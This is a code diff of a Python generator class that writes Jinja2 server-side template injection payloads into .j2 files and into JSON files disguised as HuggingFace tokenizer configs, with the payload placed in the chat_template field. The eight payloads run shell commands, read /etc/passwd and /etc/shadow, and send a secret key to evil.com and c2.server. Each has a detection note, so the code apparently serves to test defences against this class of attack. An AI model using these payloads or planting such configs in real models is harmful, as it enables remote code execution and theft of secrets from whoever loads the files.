@@ -45,19 +45,23 @@ class Jinja2BypassGenerator:
         CVE/Reference: CVE-2024-34359 variant with encoding
         Detection: Decode hex sequences before validation
         """
-        filepath = self.output_dir / "01_hex_encoded_bypass.json"
+        template = "{{ request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['eval']('__import__(\"os\").system(\"id\")') }}"
 
+        # Raw .j2 template file — the primary attack vector format
+        j2_path = self.output_dir / "01_hex_encoded_bypass.j2"
+        j2_path.write_text(template, encoding="utf-8")
+
+        # JSON wrapper mimicking a HuggingFace tokenizer_config.json
+        filepath = self.output_dir / "01_hex_encoded_bypass.json"
         payload = {
             "tokenizer_class": "LlamaTokenizer",
             "model_max_length": 4096,
-            # Hex bypass: __builtins__ becomes \\x5f\\x5fbuiltins\\x5f\\x5f
-            "chat_template": "{{ request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['eval']('__import__(\"os\").system(\"id\")') }}",
+            "chat_template": template,
             "bos_token": "<s>",
             "eos_token": "</s>",
             "eos_token_id": 2,
             "bos_token_id": 1,
         }
-
         with open(filepath, "w") as f:
             json.dump(payload, f, indent=2)
 
@@ -94,16 +98,19 @@ class Jinja2BypassGenerator:
         CVE/Reference: Jinja2 filter bypass techniques
         Detection: Restrict 'attr' filter usage or validate chains
         """
-        filepath = self.output_dir / "02_attr_filter_bypass.json"
+        template = "{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(40)|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('system')('whoami') }}"
 
+        j2_path = self.output_dir / "02_attr_filter_bypass.j2"
+        j2_path.write_text(template, encoding="utf-8")
+
+        filepath = self.output_dir / "02_attr_filter_bypass.json"
         payload = {
             "tokenizer_class": "BertTokenizer",
             "model_max_length": 512,
-            "chat_template": "{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(40)|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('system')('whoami') }}",
+            "chat_template": template,
             "vocab_size": 30522,
             "hidden_size": 768,
         }
-
         with open(filepath, "w") as f:
             json.dump(payload, f, indent=2)
 
@@ -140,16 +147,19 @@ class Jinja2BypassGenerator:
         CVE/Reference: Flask context variable exploitation
         Detection: Request object whitelist, env validation
         """
-        filepath = self.output_dir / "03_request_object_exploit.json"
+        template = "{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}"
 
+        j2_path = self.output_dir / "03_request_object_exploit.j2"
+        j2_path.write_text(template, encoding="utf-8")
+
+        filepath = self.output_dir / "03_request_object_exploit.json"
         payload = {
             "tokenizer_class": "RobertaTokenizer",
             "model_max_length": 1024,
-            "chat_template": "{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}",
+            "chat_template": template,
             "vocab_size": 50265,
             "max_position_embeddings": 514,
         }
-
         with open(filepath, "w") as f:
             json.dump(payload, f, indent=2)
 
@@ -187,18 +197,21 @@ class Jinja2BypassGenerator:
         CVE/Reference: Application config object vulnerabilities
         Detection: Config object isolation, class filtering
         """
-        filepath = self.output_dir / "04_config_object_exploit.json"
+        template = "{{ config.__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['subprocess'].call(['touch', '/tmp/pwned']) }}"
 
+        j2_path = self.output_dir / "04_config_object_exploit.j2"
+        j2_path.write_text(template, encoding="utf-8")
+
+        filepath = self.output_dir / "04_config_object_exploit.json"
         payload = {
             "tokenizer_class": "GptTokenizer",
             "model_max_length": 2048,
-            "chat_template": "{{ config.__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['subprocess'].call(['touch', '/tmp/pwned']) }}",
+            "chat_template": template,
             "special_tokens_map": {
                 "eos_token": "</s>",
                 "bos_token": "<s>",
             },
         }
-
         with open(filepath, "w") as f:
             json.dump(payload, f, indent=2)
 
@@ -235,15 +248,18 @@ class Jinja2BypassGenerator:
         CVE/Reference: Filter registration vulnerabilities
         Detection: Filter whitelist, code inspection
         """
-        filepath = self.output_dir / "05_filter_injection.json"
+        template = "{% set x = cycler.__init__.__globals__ %}{{ x.os.system('echo FILTER_INJECTION') }}"
 
+        j2_path = self.output_dir / "05_filter_injection.j2"
+        j2_path.write_text(template, encoding="utf-8")
+
+        filepath = self.output_dir / "05_filter_injection.json"
         payload = {
             "tokenizer_class": "T5Tokenizer",
             "model_max_length": 512,
-            "chat_template": "{% set x = cycler.__init__.__globals__ %}{{ x.os.system('echo FILTER_INJECTION') }}",
+            "chat_template": template,
             "extra_ids": 100,
         }
-
         with open(filepath, "w") as f:
             json.dump(payload, f, indent=2)
 
@@ -280,14 +296,17 @@ class Jinja2BypassGenerator:
         CVE/Reference: Advanced evasion techniques
         Detection: Behavioral analysis, deep inspection
         """
-        filepath = self.output_dir / "06_multi_layer_obfuscation.json"
+        template = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen('cat /etc/shadow').read() }}{% endif %}{% endfor %}"
 
+        j2_path = self.output_dir / "06_multi_layer_obfuscation.j2"
+        j2_path.write_text(template, encoding="utf-8")
+
+        filepath = self.output_dir / "06_multi_layer_obfuscation.json"
         payload = {
             "tokenizer_class": "ElectraTokenizer",
             "model_max_length": 1024,
-            "chat_template": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen('cat /etc/shadow').read() }}{% endif %}{% endfor %}",
+            "chat_template": template,
         }
-
         with open(filepath, "w") as f:
             json.dump(payload, f, indent=2)
 
@@ -324,14 +343,17 @@ class Jinja2BypassGenerator:
         CVE/Reference: Data exfiltration through SSTI
         Detection: Network egress monitoring, URL validation
         """
-        filepath = self.output_dir / "07_network_exfiltration.json"
+        template = "{{ joiner.__init__.__globals__.__builtins__.__import__('urllib.request').urlopen('http://evil.com/exfil?data=' + config.SECRET_KEY).read() }}"
 
+        j2_path = self.output_dir / "07_network_exfiltration.j2"
+        j2_path.write_text(template, encoding="utf-8")
+
+        filepath = self.output_dir / "07_network_exfiltration.json"
         payload = {
             "tokenizer_class": "LongformerTokenizer",
             "model_max_length": 4096,
-            "chat_template": "{{ joiner.__init__.__globals__.__builtins__.__import__('urllib.request').urlopen('http://evil.com/exfil?data=' + config.SECRET_KEY).read() }}",
+            "chat_template": template,
         }
-
         with open(filepath, "w") as f:
             json.dump(payload, f, indent=2)
 
@@ -369,14 +391,17 @@ class Jinja2BypassGenerator:
         CVE/Reference: Advanced persistent SSTI
         Detection: Behavior monitoring, flow analysis
         """
-        filepath = self.output_dir / "08_combined_advanced_attack.json"
+        template = "{% set x = cycler.__init__.__globals__ %}{% set y = x['__builtins__']['__import__'] %}{{ x.os.system('echo ' + y('os').environ.get('USER', 'unknown')) }} | {{ y('urllib.request').urlopen('http://c2.server/log').read() }}"
 
+        j2_path = self.output_dir / "08_combined_advanced_attack.j2"
+        j2_path.write_text(template, encoding="utf-8")
+
+        filepath = self.output_dir / "08_combined_advanced_attack.json"
         payload = {
             "tokenizer_class": "DebertaTokenizer",
             "model_max_length": 2048,
-            "chat_template": "{% set x = cycler.__init__.__globals__ %}{% set y = x['__builtins__']['__import__'] %}{{ x.os.system('echo ' + y('os').environ.get('USER', 'unknown')) }} | {{ y('urllib.request').urlopen('http://c2.server/log').read() }}",
+            "chat_template": template,
         }
-
         with open(filepath, "w") as f:
             json.dump(payload, f, indent=2)
 
